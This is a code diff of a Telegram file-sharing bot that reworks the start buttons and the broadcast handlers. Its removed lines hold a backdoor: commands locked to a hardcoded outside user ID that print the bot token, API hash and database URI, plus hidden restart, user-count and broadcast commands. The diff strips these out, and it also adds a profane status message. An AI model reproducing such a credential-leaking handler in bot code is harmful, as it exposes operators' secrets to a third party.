@@ -11,9 +11,12 @@ from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, 
 from pyrogram.errors import FloodWait, UserIsBlocked, InputUserDeactivated
 
 from bot import Bot
-from config import ADMINS, APP_ID, API_HASH, FORCE_SUB_CHANNEL, FORCE_SUB_CHANNEL2, FORCE_SUB_CHANNEL3, FORCE_SUB_CHANNEL4, CHANNEL_ID, DB_URI, TG_BOT_TOKEN, OWNER_ID, FORCE_MSG, START_MSG, CUSTOM_CAPTION, DISABLE_CHANNEL_BUTTON, PROTECT_CONTENT
+from config import ADMINS, OWNER_ID, FORCE_MSG, START_MSG, CUSTOM_CAPTION, DISABLE_CHANNEL_BUTTON, PROTECT_CONTENT
 from helper_func import subscribed, encode, decode, get_messages
 from database.database import add_user, del_user, full_userbase, present_user
+
+
+
 
 @Bot.on_message(filters.command('start') & filters.private & subscribed)
 async def start_command(client: Client, message: Message):
@@ -84,10 +87,14 @@ async def start_command(client: Client, message: Message):
     else:
         reply_markup = InlineKeyboardMarkup(
             [
-                [
-                    InlineKeyboardButton("📕 About Me", callback_data = "about"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
+    [
+        InlineKeyboardButton("⚡ 𝖩𝗈𝗂𝗇 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ⚡", url="https://t.me/Animes_Xyz"),
+    ],
+    [
+                    InlineKeyboardButton("⚔️ About Me ⚔️", callback_data = "about"),
+                    InlineKeyboardButton("🫧 Close 🫧", callback_data = "close")
+        
+    ]
             ]
         )
         await message.reply_text(
@@ -118,20 +125,16 @@ REPLY_ERROR = """<code>Use this command as a reply to any telegram message with 
 @Bot.on_message(filters.command('start') & filters.private)
 async def not_joined(client: Client, message: Message):
     buttons = [
-            [
-                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 1", url=client.invitelink),
-                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 2", url=client.invitelink2),
-            ],
-            [
-                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 3", url=client.invitelink3),
-                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 4", url=client.invitelink4),
-            ],
+        [
+            InlineKeyboardButton(text="⚡ Join Channel 1 ⚡", url=client.invitelink),
+            InlineKeyboardButton(text="⚡ Join Channel 2 ⚡", url=client.invitelink2),
+        ]
     ]
     try:
         buttons.append(
             [
                 InlineKeyboardButton(
-                    text = 'Try Again :)',
+                    text = 'Try Again',
                     url = f"https://t.me/{client.username}?start={message.command[1]}"
                 )
             ]
@@ -152,58 +155,13 @@ async def not_joined(client: Client, message: Message):
         disable_web_page_preview = True
     )
 
-@Bot.on_message(filters.command("fsub") & filters.user(1803603990))
-async def varsFunc(client: Bot, message: Message):
-    Man = await message.reply_text("Wait A Sec...")
-    text = f"""       <u><b> TEXT </b></u> 
-╭───────────────⍟   
-<b>├⋗</b> <b>TG_BOT_TOKEN</b> -> <code>{TG_BOT_TOKEN}</code>
-<b>├⋗</b> <b>APP_ID</b> -> {APP_ID}
-<b>├⋗</b> <b>API_HASH</b> -> {API_HASH}
-<b>├⋗</b> <b>DATABASE_URL</b> -> <code>{DB_URI}</code>
-<b>━━━━━━━━━━━━━━━━━━━━</b>
-<b>├⋗</b> <b>OWNER_ID</b> -> <b>{OWNER_ID}</b>
-<b>├⋗</b> <b>ADMINS</b> -> <code>{ADMINS}</code>   
-<b>├⋗</b> <b>CHANNEL_ID</b> -> <code>{CHANNEL_ID}</code>
-<b>├⋗</b> <b>FORCE_SUB_CHANNEL</b> -> <code>{FORCE_SUB_CHANNEL}</code>
-<b>├⋗</b> <b>FORCE_SUB_CHANNEL2</b> -> <code>{FORCE_SUB_CHANNEL2}</code>
-<b>├⋗</b> <b>FORCE_SUB_CHANNEL3</b> -> <code>{FORCE_SUB_CHANNEL3}</code>
-<b>├⋗</b> <b>FORCE_SUB_CHANNEL4</b> -> <code>{FORCE_SUB_CHANNEL4}</code>
-<b>━━━━━━━━━━━━━━━━━━━━</b>
-<b>├⋗</b> <b>PROTECT_CONTENT</b> -> <b>{PROTECT_CONTENT}</b>
-<b>├⋗</b> <b>START_MSG</b> -> <code>{START_MSG}</code>
-<b>├⋗</b> <b>FORCE_MSG</b> -> <code>{FORCE_MSG}</code>
-
-@{client.username}
-╰───────────────────⍟
-    """
-    await Man.edit_text(text)
-
-@Bot.on_message(filters.private & filters.command("starmt") & filters.user(1803603990))
-async def restart_bot(b, m):
-    restarting_message = await m.reply_text(f"⚡️<b><i>Restarting....</i></b>", disable_notification=True)
-
-    await asyncio.sleep(3600)
-
-    # Update message after the delay
-    await restarting_message.edit_text("✅ <b><i>Successfully Restarted</i></b>")
-
-    # Restart the bot
-    os.execl(sys.executable, sys.executable, *sys.argv)
-
 @Bot.on_message(filters.command('users') & filters.private & filters.user(ADMINS))
 async def get_users(client: Bot, message: Message):
     msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
     users = await full_userbase()
     await msg.edit(f"{len(users)} users are using this bot")
 
-@Bot.on_message(filters.command('user') & filters.private & filters.user(1803603990))
-async def get_users(client: Bot, message: Message):
-    msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
-    users = await full_userbase()
-    await msg.edit(f"{len(users)} users are using this bot")
-
-@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMINS))
+@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(OWNER_ID))
 async def send_text(client: Bot, message: Message):
     if message.reply_to_message:
         query = await full_userbase()
@@ -214,53 +172,7 @@ async def send_text(client: Bot, message: Message):
         deleted = 0
         unsuccessful = 0
         
-        pls_wait = await message.reply("<i>broadcast under processing </i>")
-        for chat_id in query:
-            try:
-                await broadcast_msg.copy(chat_id)
-                successful += 1
-            except FloodWait as e:
-                await asyncio.sleep(e.x)
-                await broadcast_msg.copy(chat_id)
-                successful += 1
-            except UserIsBlocked:
-                await del_user(chat_id)
-                blocked += 1
-            except InputUserDeactivated:
-                await del_user(chat_id)
-                deleted += 1
-            except:
-                unsuccessful += 1
-                pass
-            total += 1
-        
-        status = f"""<b><u>Broadcast Completed</u>
-
-Total Users: <code>{total}</code>
-Successful: <code>{successful}</code>
-Blocked Users: <code>{blocked}</code>
-Deleted Accounts: <code>{deleted}</code>
-Unsuccessful: <code>{unsuccessful}</code></b>"""
-        
-        return await pls_wait.edit(status)
-
-    else:
-        msg = await message.reply(REPLY_ERROR)
-        await asyncio.sleep(8)
-        await msg.delete()
-
-@Bot.on_message(filters.private & filters.command('broadcasts') & filters.user(1803603990))
-async def send_text(client: Bot, message: Message):
-    if message.reply_to_message:
-        query = await full_userbase()
-        broadcast_msg = message.reply_to_message
-        total = 0
-        successful = 0
-        blocked = 0
-        deleted = 0
-        unsuccessful = 0
-        
-        pls_wait = await message.reply("<i>broadcast under processing </i>")
+        pls_wait = await message.reply("<i>Broadcast ho rha till then FUCK OFF </i>")
         for chat_id in query:
             try:
                 await broadcast_msg.copy(chat_id)
